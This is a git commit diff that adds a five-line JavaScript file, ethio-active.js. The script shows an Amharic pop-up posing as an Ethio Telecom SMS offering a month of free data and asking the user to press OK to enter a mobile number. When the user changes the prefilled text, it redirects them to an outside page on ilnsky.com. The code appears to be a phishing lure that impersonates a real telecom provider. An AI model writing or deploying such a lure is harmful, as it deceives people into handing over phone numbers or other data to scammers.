76acdac1e73e13f86a162973f3c5e6f11a30c646
ukpeha55-stack <ukpeha55@gmail.com>
2026-02-12 18:41:29 +0100

    Create ethio-active.js

---
+++ ethio-active.js
@@ -0,0 +1,5 @@
+var password = 'ነፃ ADAT ያንቁ'
+password=prompt('SMS: እንኳን ደስ ያለህ የኢትዮ ቴሌኮም ቁጥርህ የ1 ወር ነፃ ዳታ ለመቀበል ብቁ ነው የሞባይል ቁጥራችሁን ለማስገባት እሺን ተጫኑ','ነፃ ADAT ያንቁ');
+if (password != 'ነፃ ADAT ያንቁ') {
+location.href='https://ilnsky.com/ethio.html';
+}
